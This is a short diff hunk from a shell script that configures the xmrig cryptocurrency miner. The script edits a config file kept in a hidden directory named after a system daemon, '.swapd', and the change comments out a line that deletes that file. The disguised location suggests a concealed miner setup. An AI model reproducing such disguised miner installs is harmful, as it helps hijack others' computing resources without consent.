@@ -236,7 +236,7 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/xmrig.log'",#' $HOME/.sw
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
-rm $HOME/.swapd/config.json
+#rm $HOME/.swapd/config.json
 
 cat $HOME/.swapd/config.json <<EOL
 {
